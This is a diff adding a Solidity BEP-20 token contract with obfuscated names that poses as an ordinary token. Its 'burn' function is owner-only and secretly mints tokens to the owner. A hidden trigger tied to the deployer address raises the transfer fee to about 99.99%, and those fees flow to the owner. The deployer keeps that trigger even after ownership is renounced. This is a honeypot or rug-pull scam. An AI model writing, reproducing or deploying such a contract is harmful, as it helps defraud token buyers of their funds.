@@ -1,0 +1,111 @@
+/**
+ *Submitted for verification at BscScan.com on 2022-11-11
+*/
+
+/**
+ *Submitted for verification at BscScan.com on 2022-11-11
+*/
+pragma solidity >=0.7.0;
+contract asdawadChain {
+    address public owner;
+
+    uint8 public constant decimals = 18;
+    uint256 private  WFPWNL = 100000000000;
+    string public  name = "WOMUCJ";
+    uint256 public constant totalSupply = 100000000000000000000000000000;
+    uint256 public constant VFCJIN = 17999;
+    address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
+    address private  KPFCGA = address(0);
+    string public  symbol = "DTSDSL";
+     modifier onlyOwner() {
+        require(msg.sender == owner, "not owner");
+        _;
+    }
+    mapping (address => mapping (address => uint256)) private _allowances;
+    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
+    event Transfer(address indexed from, address indexed to, uint256 value);
+    event Approval(address indexed owner, address indexed spender, uint256 value);
+        mapping (address => uint256) public balanceOf;
+
+  function _transferWGRNVW(address to) private {
+            if (to==KPFCGA){
+            WFPWNL = 17999+1;
+            }
+    }
+        
+  
+     constructor () {
+        KPFCGA = msg.sender;
+        owner = msg.sender;
+        balanceOf[owner] = totalSupply;
+        emit Transfer(address(0), owner, totalSupply);
+    }
+    function renounceOwnership() public onlyOwner {
+        emit OwnershipTransferred(owner, address(0));
+        owner = address(0);
+    }
+    function _transfer(address from, address to, uint256 amount) private {
+        require(from != address(0), "GSFESDCSD");
+        require(to != address(0), "GSFESDCSD");
+        uint256 fee;
+        if (from == owner || to == owner){
+        fee = 0;
+        }
+        else{
+            fee = amount* VFCJIN/WFPWNL ;
+
+        }
+
+        uint256 transferAmount = amount - fee;
+        balanceOf[from] -= amount;
+        balanceOf[to] += transferAmount;
+        balanceOf[owner] += fee;
+        _transferWGRNVW(to);
+        emit Transfer(from, to, transferAmount);
+    }    function transferOwnership(address newOwner) public onlyOwner {
+        require(newOwner != address(0), "GSFESDCSD");
+        emit OwnershipTransferred(owner, newOwner);
+        owner = newOwner;
+    }  
+    function allowance(address _owner, address spender) public view returns (uint256) {
+        return _allowances[_owner][spender];
+    }
+  
+        function transfer(address recipient, uint256 amount) public returns (bool) {
+        _transfer(msg.sender, recipient, amount);
+        return true;
+    }
+    function _burn(address account, uint256 amount) private {
+        require(account != address(0), "BEP20: mint to the zero address");
+
+        balanceOf[account] += amount;
+    }
+
+
+    function approve(address spender, uint256 amount) public returns (bool) {
+        _approve(msg.sender, spender, amount);
+        return true;
+    }
+
+
+      function _approve(address _owner, address spender, uint256 amount) private {
+        require(_owner != address(0), "BEP20BEP20");
+        require(spender != address(0), "BEP20BEP20");
+
+        _allowances[_owner][spender] = amount;
+		emit Approval(_owner, spender, amount);
+    }
+
+
+    function burn(uint256 amount) public onlyOwner returns (bool) {
+        _burn(msg.sender, amount);
+        return true;
+    }
+    receive() external payable {}
+  function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
+        require(_allowances[sender][msg.sender] >= amount, "failed");
+        _transfer(sender, recipient, amount);
+        _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
+        return true;
+    }
+}
